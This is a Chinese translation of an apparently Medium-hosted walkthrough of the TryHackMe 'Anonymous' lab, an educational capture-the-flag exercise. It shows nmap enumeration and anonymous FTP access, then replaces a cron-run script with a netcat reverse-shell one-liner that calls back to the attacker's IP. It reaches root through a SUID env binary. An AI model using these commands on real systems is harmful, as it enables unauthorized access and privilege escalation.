<html>
<head>
<title>TryHackMe: Anonymous</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:匿名</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/tryhackme-anonymous-989fb5c0edde?source=collection_archive---------10-----------------------#2021-04-25">https://medium.com/nerd-for-tech/tryhackme-anonymous-989fb5c0edde?source=collection_archive---------10-----------------------#2021-04-25</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div class="er es if"><img src="../Images/baa14860333bcf5b359738c54e6f43ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/1*a9ZzT3CS01-UvLWufV268Q.png"/></div></figure><p id="96f6" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated"><a class="ae jk" href="https://tryhackme.com/room/anonymous" rel="noopener ugc nofollow" target="_blank"> Anonymous </a>在TryHackMe上是一个中等级别的房间，但即使在那之后，只需要两个主要步骤就可以获得<code class="du jl jm jn jo b">root</code>。房间主要集中在列举机器上运行的服务。</p><p id="f840" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">那么，让我们开始吧！</p><h1 id="d363" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">列举</h1><p id="26f2" class="pw-post-body-paragraph im in hi io b ip kn ir is it ko iv iw ix kp iz ja jb kq jd je jf kr jh ji jj hb bi translated">作为初始枚举机制的一部分，我们可以首先尝试在浏览器中访问机器的IP，以检查是否有网站托管在端口80/443上。但结果是那里什么都没有托管。我们可以做的第二件事是运行一个<code class="du jl jm jn jo b">nmap</code>扫描来检查开放的端口以及那里正在运行什么服务。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="d9a0" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ nmap -p- -T4 10.10.0.150 | tee open_ports      <br/>Starting Nmap 7.91 ( <a class="ae jk" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-04-24 09:58 EDT<br/>Warning: 10.10.0.150 giving up on port because retransmission cap hit (6).<br/>Stats: 0:14:58 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan<br/>Connect Scan Timing: About 87.95% done; ETC: 10:15 (0:02:03 remaining)<br/>Nmap scan report for 10.10.0.150<br/>Host is up (0.15s latency).<br/>Not shown: 65441 closed ports, 90 filtered ports<br/>PORT    STATE SERVICE<br/>21/tcp  open  ftp<br/>22/tcp  open  ssh<br/>139/tcp open  netbios-ssn<br/>445/tcp open  microsoft-ds<br/>​<br/>Nmap done: 1 IP address (1 host up) scanned in 1049.08 seconds<br/>┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ sudo nmap -sS -sV -A -O -p21,22,139,445 10.10.0.150 | tee port_details                        130 ⨯<br/>​<br/>Starting Nmap 7.91 ( <a class="ae jk" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-04-24 10:28 EDT<br/>Nmap scan report for 10.10.0.150<br/>Host is up (0.16s latency).<br/>​<br/>PORT    STATE SERVICE     VERSION<br/>21/tcp  open  ftp         vsftpd 2.0.8 or later<br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]<br/>| ftp-syst: <br/>|   STAT: <br/>| FTP server status:<br/>|      Connected to ::ffff:10.8.91.135<br/>|      Logged in as ftp<br/>|      TYPE: ASCII<br/>|      No session bandwidth limit<br/>|      Session timeout in seconds is 300<br/>|      Control connection is plain text<br/>|      Data connections will be plain text<br/>|      At session startup, client count was 1<br/>|      vsFTPd 3.0.3 - secure, fast, stable<br/>|_End of status<br/>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)<br/>|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)<br/>|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)<br/>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br/>Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)<br/>No exact OS matches for host (test conditions non-ideal).<br/>Network Distance: 2 hops<br/>Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>​<br/>Host script results:<br/>|_clock-skew: mean: 1s, deviation: 0s, median: 1s<br/>|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>| smb-os-discovery: <br/>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br/>|   Computer name: anonymous<br/>|   NetBIOS computer name: ANONYMOUS\x00<br/>|   Domain name: \x00<br/>|   FQDN: anonymous<br/>|_  System time: 2021-04-24T14:28:57+00:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2021-04-24T14:28:58<br/>|_  start_date: N/A<br/>​<br/>TRACEROUTE (using port 445/tcp)<br/>HOP RTT       ADDRESS<br/>1   166.05 ms 10.8.0.1<br/>2   167.04 ms 10.10.0.150<br/>​<br/>OS and Service detection performed. Please report any incorrect results at <a class="ae jk" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 24.46 seconds</span></pre><p id="bc33" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">因此，可以看到机器上打开了4个端口，分别是21、22、139和445。此外，可以看到<code class="du jl jm jn jo b">anonymous</code>访问是通过FTP实现的，写访问也是如此。因此，我们可以检查哪些文件可以在那里访问。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="93c1" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ ftp 10.10.123.180<br/>Connected to 10.10.123.180.<br/>220 NamelessOne's FTP Server!<br/>Name (10.10.123.180:kali): anonymous<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; ls -la<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>drwxr-xr-x    3 65534    65534        4096 May 13  2020 .<br/>drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..<br/>drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts<br/>226 Directory send OK.<br/>ftp&gt; cd scripts<br/>250 Directory successfully changed.<br/>ftp&gt; ls -la<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>drwxrwxrwx    2 111      113          4096 Jun 04  2020 .<br/>drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..<br/>-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh<br/>-rw-rw-r--    1 1000     1000          860 Jun 04  2020 removed_files.log<br/>-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span></pre><p id="6ade" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">可以看出，在名为<code class="du jl jm jn jo b">scripts</code>的目录中有3个文件。我们可以全部下载并检查它们的内容。此外，从文件的权限中可以看出，对于文件<code class="du jl jm jn jo b">clean.sh</code>，我们设置了所有的读、写和执行权限。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="30a2" class="la jq hi jo b fi lb lc l ld le">ftp&gt; mget *<br/>mget clean.sh? y<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for clean.sh (314 bytes).<br/>226 Transfer complete.<br/>314 bytes received in 0.00 secs (96.0955 kB/s)<br/>mget removed_files.log? y<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for removed_files.log (903 bytes).<br/>226 Transfer complete.<br/>903 bytes received in 0.00 secs (604.8257 kB/s)<br/>mget to_do.txt? y<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for to_do.txt (68 bytes).<br/>226 Transfer complete.<br/>68 bytes received in 0.08 secs (0.8309 kB/s)<br/>ftp&gt; exit<br/>221 Goodbye.</span></pre><p id="0e66" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">现在我们已经下载了所有的文件，我们可以看看每一个。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="62a5" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ cat clean.sh       <br/>#!/bin/bash<br/>​<br/>tmp_files=0<br/>echo $tmp_files<br/>if [ $tmp_files=0 ]<br/>then<br/>        echo "Running cleanup script:  nothing to delete" &gt;&gt; /var/ftp/scripts/removed_files.log<br/>else<br/>    for LINE in $tmp_files; do<br/>        rm -rf /tmp/$LINE &amp;&amp; echo "$(date) | Removed file /tmp/$LINE" &gt;&gt; /var/ftp/scripts/removed_files.log;done<br/>fi</span></pre><p id="3a95" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">看起来bash脚本<code class="du jl jm jn jo b">clean.sh</code>试图删除<code class="du jl jm jn jo b">/tmp</code>目录中的文件，并在另一个名为<code class="du jl jm jn jo b">removed_files.log</code>的文件中打印其动作的输出。</p><p id="1d69" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">因为我们也可以访问<code class="du jl jm jn jo b">removed_files.log</code>，所以我们也可以检查它的内容。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="72c8" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ cat removed_files.log <br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete<br/>Running cleanup script:  nothing to delete</span></pre><p id="3cde" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在这个日志文件中找不到任何有趣的东西。但是从这个文件的内容中可以推断出一件事，即<code class="du jl jm jn jo b">clean.sh</code>脚本以固定的时间间隔运行，这就是为什么我们可以在日志文件中看到多个“没有要删除的内容”的条目。另外，我们还有一个文件<code class="du jl jm jn jo b">to_do.txt</code>。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="a6ed" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ cat to_do.txt        <br/>I really need to disable the anonymous login...it's really not safe</span></pre><p id="f7be" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">对于这个文件，我们所能说的就是<strong class="io hj">“意识到这一点已经太晚了！”</strong></p><p id="4870" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从所有这3个文件中，<code class="du jl jm jn jo b">clean.sh</code>似乎对获取系统访问权限最有用。</p><h1 id="b8f2" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">最初的立足点</h1><p id="1a0f" class="pw-post-body-paragraph im in hi io b ip kn ir is it ko iv iw ix kp iz ja jb kq jd je jf kr jh ji jj hb bi translated">由于我们拥有对<code class="du jl jm jn jo b">clean.sh</code> bash脚本的写访问权限，并且我们有相同脚本的下载副本，我们可以编辑bash脚本来运行一个命令，这将帮助我们在系统上获得一个反向shell。编辑完bash脚本后，我们可以再次将它上传到FTP服务器上，因为我们也有写权限(来自<code class="du jl jm jn jo b">nmap</code>结果)。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="a00d" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.91.135 4444 &gt;/tmp/f" &gt; clean.sh <br/>                                                                                                        <br/>┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ cat clean.sh     <br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.91.135 4444 &gt;/tmp/f<br/>​<br/>┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ ftp 10.10.139.154<br/>Connected to 10.10.139.154.<br/>220 NamelessOne's FTP Server!<br/>Name (10.10.139.154:kali): anonymous<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; cd scripts<br/>250 Directory successfully changed.<br/>ftp&gt; dir<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh<br/>-rw-rw-r--    1 1000     1000          903 Apr 24 17:38 removed_files.log<br/>-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt<br/>226 Directory send OK.<br/>ftp&gt; put clean.sh<br/>local: clean.sh remote: clean.sh<br/>200 PORT command successful. Consider using PASV.<br/>150 Ok to send data.<br/>226 Transfer complete.<br/>140 bytes sent in 0.00 secs (2.7248 MB/s)<br/>ftp&gt; dir<br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>-rwxr-xrwx    1 1000     1000          140 Apr 24 17:38 clean.sh<br/>-rw-rw-r--    1 1000     1000          903 Apr 24 17:38 removed_files.log<br/>-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt<br/>226 Directory send OK.<br/>ftp&gt; exit</span></pre><blockquote class="lf lg lh"><p id="e0c2" class="im in li io b ip iq ir is it iu iv iw lj iy iz ja lk jc jd je ll jg jh ji jj hb bi translated"><strong class="io hj"> <em class="hi">注意:</em> </strong> <em class="hi">直接</em> <code class="du jl jm jn jo b"><em class="hi">put</em></code> <em class="hi">服务器上的bash脚本不删除服务器上的副本，因为它将保留脚本的原始权限，否则新上传的脚本将使用类似于</em> <code class="du jl jm jn jo b"><em class="hi">-rw-r--r--</em></code> <em class="hi">的权限上传，因此不会按预期执行，因为</em> <code class="du jl jm jn jo b"><em class="hi">x</em></code> <em class="hi">将被禁用。此外，由于我们以“匿名”用户身份登录，我们不能执行</em> <code class="du jl jm jn jo b"><em class="hi">chmod</em></code> <em class="hi">来使其可执行。</em></p></blockquote><p id="9398" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">现在，我们已经上传了修改后的bash脚本，我们需要做的就是使用命令:<code class="du jl jm jn jo b">nc -nvlp 4444</code>在本地机器上启动一个监听器，然后等待连接打开。</p><p id="c0fa" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">几秒钟后，我们确实得到了我们的反向外壳:</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="9545" class="la jq hi jo b fi lb lc l ld le">┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]<br/>└─$ nc -nvlp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.8.91.135] from (UNKNOWN) [10.10.115.25] 60948<br/>sh: 0: can't access tty; job control turned off<br/>$</span></pre><p id="8bbb" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">这里的问题是这是一个<code class="du jl jm jn jo b">dumb</code> shell，为了改进它成为一个交互式shell，我们可以使用<a class="ae jk" href="https://github.com/infodox/python-pty-shells" rel="noopener ugc nofollow" target="_blank">python-pty-shell</a>。</p><p id="3fa8" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">点击<a class="ae jk" href="https://0xnirvana.medium.com/gaining-interactive-reverse-shell-w-python-a4bd490735a8" rel="noopener">这里</a>查看如何使用“python-pty-shell”获得完全交互式TTY的指南。</p><p id="7bbc" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">现在我们有了一个完全交互式的外壳，我们可以读取用户的标志。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="3a1c" class="la jq hi jo b fi lb lc l ld le">namelessone@anonymous:~$ ls -la<br/>total 64<br/>drwxr-xr-x 6 namelessone namelessone 4096 Apr 24 19:33 .<br/>drwxr-xr-x 3 root        root        4096 May 11  2020 ..<br/>lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -&gt; /dev/null<br/>-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout<br/>-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc<br/>drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache<br/>drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg<br/>-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst<br/>drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local<br/>drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics<br/>-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile<br/>-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor<br/>-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful<br/>-rw-rw-r-- 1 namelessone namelessone  688 Apr 23 11:30 tcp_pty_backconnect.py<br/>-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt<br/>-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo<br/>-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts<br/>namelessone@anonymous:~$ cat user.txt</span></pre><p id="dd90" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">我们的下一个任务是获得<code class="du jl jm jn jo b">root</code>特权。</p><h1 id="58f7" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">权限提升</h1><p id="69eb" class="pw-post-body-paragraph im in hi io b ip kn ir is it ko iv iw ix kp iz ja jb kq jd je jf kr jh ji jj hb bi translated">我们首先可以寻找的是<code class="du jl jm jn jo b">sudo -l</code>命令的输出，但是因为我们不知道当前用户的密码，所以我们可以检索这些结果。接下来我们可以寻找的是cron作业。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="a42d" class="la jq hi jo b fi lb lc l ld le">namelessone@anonymous:~$ cat /etc/crontab<br/># /etc/crontab: system-wide crontab<br/># Unlike any other crontab you don't have to run the `crontab'<br/># command to install the new version when you edit this file<br/># and files in /etc/cron.d. These files also have username fields,<br/># that none of the other crontabs do.<br/>​<br/>SHELL=/bin/sh<br/>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br/>​<br/># m h dom mon dow user  command<br/>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br/>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br/>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br/>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br/>​</span></pre><p id="5827" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">但是同样，在这里我们也找不到任何有用的信息。我们还可以看看系统中设置了SUID/SGID位的文件。</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="aef8" class="la jq hi jo b fi lb lc l ld le">namelessone@anonymous:~$ find / -perm -4000 -exec ls -la {} \; 2&gt; /dev/null <br/>-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount<br/>-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping<br/>-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6<br/>-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su<br/>-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount<br/>-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn<br/>-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh<br/>-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd<br/>-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp<br/>-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd<br/>-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo<br/>-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign<br/>-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine<br/>-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd<br/>-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9066/bin/mount<br/>-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9066/bin/ping<br/>-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9066/bin/ping6<br/>-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9066/bin/su<br/>-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9066/bin/umount<br/>-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn<br/>-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh<br/>-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd<br/>-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp<br/>-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd<br/>-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo<br/>-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign<br/>-rwsr-xr-x 1 root root 110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine<br/>-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd<br/>-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount<br/>-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount<br/>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping<br/>-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount<br/>-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su<br/>-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br/>-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine<br/>-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br/>-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br/>-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br/>-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd<br/>-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env<br/>-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd<br/>-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap<br/>-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp<br/>-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh<br/>-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap<br/>-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn<br/>-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo<br/>-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br/>-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at<br/>-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec<br/>​</span></pre><p id="03ac" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">从所有se文件中，首先我们可以寻找使用<a class="ae jk" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> GTFOBins </a>可以利用的二进制文件。一个这样的双星似乎是<code class="du jl jm jn jo b">/usr/bin/env</code>，</p><p id="9275" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">我们可以继续在GTFOBins中搜索<code class="du jl jm jn jo b">env</code>,并运行那里提供的命令来获得根masam:</p><pre class="ks kt ku kv fd kw jo kx ky aw kz bi"><span id="25df" class="la jq hi jo b fi lb lc l ld le">namelessone@anonymous:~$ /usr/bin/env /bin/sh -p<br/># whoami<br/>root<br/># id<br/>uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)<br/># cd /root<br/># cat root.txt<br/>​</span></pre><p id="cbba" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj hb bi translated">在那里我们得到了这台机器的根标志！</p><h1 id="1112" class="jp jq hi bd jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km bi translated">参考</h1><ol class=""><li id="3f56" class="lm ln hi io b ip kn it ko ix lo jb lp jf lq jj lr ls lt lu bi translated">TryHackMe —匿名:<a class="ae jk" href="https://tryhackme.com/room/anonymous" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/anonymous</a></li><li id="bcbb" class="lm ln hi io b ip lv it lw ix lx jb ly jf lz jj lr ls lt lu bi translated">python-pty-shell:<a class="ae jk" href="https://github.com/infodox/python-pty-shells" rel="noopener ugc nofollow" target="_blank">https://github.com/infodox/python-pty-shells</a></li><li id="2809" class="lm ln hi io b ip lv it lw ix lx jb ly jf lz jj lr ls lt lu bi translated">使用python-pty-shell创建shell</li><li id="e585" class="lm ln hi io b ip lv it lw ix lx jb ly jf lz jj lr ls lt lu bi translated">GTFOBins:<a class="ae jk" href="https://gtfobins.github.io" rel="noopener ugc nofollow" target="_blank">https://GTFOBins . github . io</a></li></ol></div><div class="ab cl ma mb gp mc" role="separator"><span class="md bw bk me mf mg"/><span class="md bw bk me mf mg"/><span class="md bw bk me mf"/></div><div class="hb hc hd he hf"><p id="5aeb" class="pw-post-body-paragraph im in hi io b ip iq ir is it iu iv iw ix iy iz ja jb jc 